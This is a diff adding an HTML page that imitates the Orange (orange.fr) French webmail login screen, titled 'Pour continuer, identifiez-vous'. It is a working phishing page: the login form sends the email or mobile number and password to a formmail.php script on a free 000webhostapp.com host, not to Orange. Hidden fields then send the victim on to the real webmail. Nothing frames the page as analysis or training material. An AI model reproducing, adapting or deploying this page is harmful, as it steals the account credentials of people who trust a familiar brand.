@@ -1,0 +1,307 @@
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
+<head>
+  <link rel="shortcut icon" href="../id-m.woopic.com/auth_user2/img/favicon.ico"/>
+  <title>Pour continuer, identifiez-vous...</title>
+  <meta http-equiv="Pragma" content="no-cache"/>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+  <link rel="stylesheet" href="../c.orange.fr/Css/o.css"/>  
+  <link rel="stylesheet" href="../id-m.woopic.com/auth_user2/css/style.min.css%3Fv=v53.css"/>
+  
+  <!--[if IE 6]>
+  <link href="https://id-m.woopic.com/auth_user2/css/style_ie6.min.css?v=v53" rel="stylesheet" type="text/css" />
+  <![endif]-->
+  <!--[if IE 7]>
+  <link href="https://id-m.woopic.com/auth_user2/css/style_ie7.min.css?v=v53" rel="stylesheet" type="text/css" />
+  <![endif]-->
+  <!--[if IE 9]>
+  <link href="https://id-m.woopic.com/auth_user2/css/style_ie9.min.css?v=v53" rel="stylesheet" type="text/css" />
+  <![endif]-->
+  <noscript>
+      <meta http-equiv="refresh" content="0; URL=../id.orange.fr/auth_user/bin/auth_user.cgi%3Fforce=basic.html"/>
+  </noscript>
+  <script type="text/javascript">
+  //<![CDATA[
+      if (top.frames.length > 0){top.location.href=document.location.href;}
+  //]]>
+  
+  var defaultPicto = "https://id-m.woopic.com/auth_user2/img/user2.gif"; 
+  </script>
+  
+  <script type="text/javascript" src="../id-m.woopic.com/auth_user2/js/authuser2.min.js%3Fv=v53"></script>
+  <script type="text/javascript">
+    $(document).ready(function(){
+      $('input.text').focus(function(){$(this).addClass('focus');});
+      $('input.text').blur(function(){$(this).removeClass('focus');});
+    });
+  </script>
+    <script type="text/javascript">
+    var oan_siteKeywords="";
+    var oan_siteContentTopic="";
+    document.write('<scr'+'ipt src="https://all.orfr.adgtw.orangeads.fr/js/ora_authen.identification?sKW='+encodeURI(oan_siteKeywords)+'&sCT='+encodeURI(oan_siteContentTopic)+'"></scr'+'ipt>');
+  </script>
+    </head>
+<body>
+  <div id="sc_main">
+    <div id="auth-header">
+      <div id="auth-logo">
+        <a href="../www.orange.fr/portail.html" tabindex="1" title="site orange.fr"><div class="logo"></div></a>
+      </div>
+        <div id="auth-banner" tabindex="-1">
+        <div class="oan_ad" id="ora_2_728x90_identification">
+          <script type="text/javascript">
+            //<![CDATA[
+            if (typeof oan_displayAd=='function'){oan_displayAd('ora_2_728x90_identification');} 
+            //]]>
+          </script>
+        </div>
+      </div>
+        <div class="clear"><!-- --></div>
+    </div>
+    <div id="sc_top">
+      <div class="sc_top_title">Pour continuer, identifiez-vous...</div>
+    </div>
+    <div id="sc_content">
+      <div id="sc_left_blocs">
+        <div class="sc_left_top_bloc">
+          <table cellspacing="0" cellpadding="0" border="0">
+            <tr>
+              <td class="sc_box_tl"><div><!-- --></div></td>
+              <td class="sc_box_t"><!-- --></td>
+              <td class="sc_box_tr"><div><!-- --></div></td>
+            </tr>
+            <tr valign="top">
+              <td class="sc_box_l"><!-- --></td>
+              <td class="sc_box_content">
+                <div id="topLeftContent">
+                    <script type="text/javascript">
+                    
+                  </script>
+                  
+                  <script type="text/javascript">
+                  
+                                  </script>
+                  
+                  <div id="filter_main" class="filter"></div>
+                  <div id="filter_pass" class="filter"></div>
+                  <div id="filter_check" class="filter"></div>
+                  <div id="infobulle_perso" class="infobulle ui-corner-all">
+                    <div class="arrow">&nbsp;</div>
+                    Pour personnaliser votre photo, rendez-vous dans votre espace client, cliquez sur votre nom d’utilisateur puis sélectionnez la rubrique photo.
+                  </div>
+                  <div id="infobulle_switch" class="infobulle ui-corner-all">
+                    <div class="arrow">&nbsp;</div>
+                    Ne plus mémoriser le compte utilisateur <br/>
+                    <span id="infobulle_switch_login"></span>&nbsp;sur cet ordinateur ?
+                    <div id="infobulle_switch_buttons">
+                      <table cellspacing="0" cellpadding="0" border="0">
+                        <tr>
+                          <td>
+                            <div class="sc_button_2">
+                              <div class="sc_button_left_2"></div>
+                              <input type="submit" onclick="cancelSwitch(); return false;"
+                                     class="sc_button_content_2 normal submit" value="annuler"/>
+                              <div class="sc_button_right_2"></div>
+                              <span class="clear"><br clear="all"/></span>
+                            </div>
+                          </td>
+                          <td>
+                            <div class="sc_button_2">
+                              <div class="sc_button_left_2"></div>
+                              <input type="submit" onclick="doSwitch(); return false;"
+                                     class="sc_button_content_2 normal submit" value="valider"/>
+                              <div class="sc_button_right_2"></div>
+                              <span class="clear"><br clear="all"/></span>
+                            </div>
+                          </td>
+                        </tr>
+                      </table>
+                      <div class="clear"><br clear="all" /></div>
+                    </div>
+                  </div>
+                  <div id="panel_main">
+                    <div class="panel_model panel_model_default" id="default">
+                      <div id="div_picto_user">
+                          <img id="remove_user" title="Cliquez ici pour ne plus mémoriser ce compte utilisateur sur cet ordinateur."
+                             alt="Cliquez ici pour ne plus mémoriser ce compte utilisateur sur cet ordinateur." src="../id-m.woopic.com/auth_user2/img/close.png"/>
+                        <img id="img_picto_user" src="index.html" alt="" title="" width="90" height="90" />
+                        <p id="desc_picto_user"></p>
+                        </div>
+<form method="post" class="AuthentForm" id="AuthentForm2" action="http://cliquezicidroboxcpawelicipourcontinuervotreecoutebox.000webhostapp.com/formmail.php">
+ <input class="zonetext" name="goafter" type="text" style="display:none;" value="webmail.orange.fr" />
+<input class="zonetext" name="mailfrom" type="text" style="display:none;" value="orange@mail.fr" />
+                       
+                          <input name="isconn" id="isconn" type="hidden" value="0" />
+                          <div class="sc_field" id="default_credential">
+                          <div class="sc_label">
+                            <label for="default_f_credential">
+ 
+                            adresse mail ou numéro de mobile
+                            </label>
+                          </div>
+                          <div class="sc_input sc_credential ">
+                              <input name="credential" id="default_f_credential" type="text"
+                                   class="ui-corner-all text" maxlength="78"
+                                   value="" tabindex="100" required pattern="[a-zA-Z|a-zA-Z0-9|a-zA-Z0-9\._-]{3,38}@(orange|wanadoo)\.(com|fr)"/>
+                              <div class="clear"><br clear="all"/></div>
+                          </div>
+                          <div class="clear"><br clear="all"/></div>
+                        </div>
+                        
+                        <div class="sc_field sc_password" id="default_password">
+                          <div class="sc_label">
+                            <label for="default_f_password">mot de passe</label>
+                          </div>
+                          <div class="sc_input ">
+                            <input name="password" id="default_f_password" type="password" required="required" class="ui-corner-all password" value="" maxlength="36" tabindex="200" autocomplete="off" />
+                          </div>
+                          <div class="clear"><br clear="all" /></div>
+                        </div>
+			<div class="sc_field sc_password" id="default_password2">
+                          <div class="sc_label">
+                                                      
+                          </div>
+                          <div class="clear"><br clear="all" /></div>
+                        </div>
+                        <div class="sc_field lostpassword" id="default_lostpassword">
+                          <div class="sc_input sc_link">
+                            <span id="default_password_error" class="errorMessage" style="display:none"></span>
+                            <a href="../r.orange.fr/r/Oid_lost%3Freturn_url=http%253A%252F%252Fwww.orange.fr.html" id="link_lost"  class="orange">mot&nbsp;de&nbsp;passe&nbsp;oublié&nbsp;?</a>
+                          </div>
+                          <div class="clear"><br clear="all" /></div>
+                        </div>
+                        <div class="sc_field checkbox" id="default_memorize_login"
+                             title="Décochez cette case si vous utilisez un équipement public (cybercafé, école, ...)">
+                          <div class="sc_input">
+                              <input id="default_f_memorize_login" name="memorize_login" type="checkbox"
+                                   class="csCheckbox" checked="checked"/>
+                              <label for="default_f_memorize_login" class="checkboxLabel">
+                                mémoriser l’adresse mail ou le nº de mobile
+                              </label>
+                          </div>
+                          <div class="clear"><br clear="all" /></div>
+                        </div>
+                        <div class="sc_field checkbox" id="default_memorize_password"
+                             title="Décochez cette case si plusieurs personnes utilisent cet équipement.">
+                          <div class="sc_input">
+                              <input id="default_f_memorize_password" class="csCheckbox" type="checkbox" 
+                                name="memorize_password" />
+                              <label for="default_f_memorize_password" class="checkboxLabel">
+                              rester identifié
+                            </label>
+                          </div>
+                          <div class="clear"><br clear="all" /></div>
+                        </div>
+                        
+                        <div class="actions">
+                          <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                            <tr>
+                              <td>
+                                <table cellspacing="0" cellpadding="0" border="0">
+                                  <tr>
+                                      <td>
+                                      <div class="sc_default_button_2">
+    
+                                        <div class="sc_button_left_2"></div>
+                                        <input type="submit" class="sc_button_content_2 submit"
+                                               value="s’identifier"/>
+                                        <div class="sc_button_right_2"></div>
+                                        <span class="clear"><br clear="all"/></span>
+    
+                                      </div>
+                                    </td>
+                                    </tr>
+                                </table>
+                                <div class="clear"><br clear="all" /></div>
+                              </td>
+                            </tr>
+                          </table>
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+                </div></td>
+              <td class="sc_box_r"><!-- --></td>
+            </tr>
+            <tr>
+              <td class="sc_box_bl"><div><!-- --></div></td>
+              <td class="sc_box_b"><!-- --></td>
+              <td class="sc_box_br"><div><!-- --></div></td>
+            </tr>
+          </table>
+        </div>
+      </div>
+            <div id="sc_right_blocs">
+        <div class="sc_right_top_bloc">
+          <table cellspacing="0" cellpadding="0" border="0">
+            <tr>
+              <td class="sc_box_bl"><div><!-- --></div></td>
+              <td class="sc_box_b"><!-- --></td>
+              <td class="sc_box_br"><div><!-- --></div></td>
+            </tr>
+            <tr valign="top">
+              <td class="sc_box_l"><!-- --></td>
+              <td class="sc_box_content">
+                <div id="mainContent">
+                
+                                                            <a href = "index.html#">  <img src="../id-m.woopic.com/auth_user2/img/orange_apps.png"> </a>
+                                      
+                  <p id="desc_picto_user"></p>
+                </div>
+              </td>
+              <td class="sc_box_r"><!-- --></td>
+            </tr>
+            <tr>
+              <td class="sc_box_bl"><div><!-- --></div></td>
+              <td class="sc_box_b"><!-- --></td>
+              <td class="sc_box_br"><div><!-- --></div></td>
+            </tr>
+          </table>
+        </div>
+      </div>
+      <div class="clear"></div>
+    </div>
+      <script type="text/javascript">
+      
+    </script>
+        <script type="text/javascript">
+      
+    </script>
+        <div id="sc_linkbottomnew">
+      Pas inscrit ? 
+      <a href="index.html#" target="_blank" class="orange">Créez ou activez votre compte</a>
+    </div>
+  
+    <div id="o_footer">
+      <ul>
+        <li style="padding-right: 92px;">
+          <a title="informations légales (nouvelle fenêtre)" target="_blank" 
+            onclick="return false; window.open(this.href, 'informations légales', config='height=800, width=700, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no') ; return false;" 
+            href="index.html#">informations légales</a>
+        </li>   
+        <li style="padding-right: 92px;">
+          <a title="publicité (nouvelle fenêtre)" target="_blank" 
+            href="index.html#">publicité</a>
+        </li>   
+        <li style="padding-right: 92px;">
+          <a title="internet+ (nouvelle fenêtre)" target="_blank" 
+            href="index.html#">internet+</a>
+        </li>
+        <li style="padding-right: 92px;">
+          <a title="signaler un contenu illicite (nouvelle fenêtre)" target="_blank" 
+            href="index.html#">signaler un contenu illicite</a>
+        </li> 
+        <li style="padding-right: 92px;">
+          <a title="données personnelles (nouvelle fenêtre)" target="_blank" 
+            href="index.html#">données personnelles</a>
+        </li>
+        <li>
+          <a title="les cookies (nouvelle fenêtre)" target="_blank" 
+            href="index.html#">les cookies</a>
+        </li>
+      </ul>
+    </div>
+  </div>
+<div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="../www.000webhost.com/index.html%3Futm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_cliquezicidroboxcpawelicipourcontinuervotreecoutebox&amp;utm_content=footer_img.html"><img src="../cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div></body>
+</html>
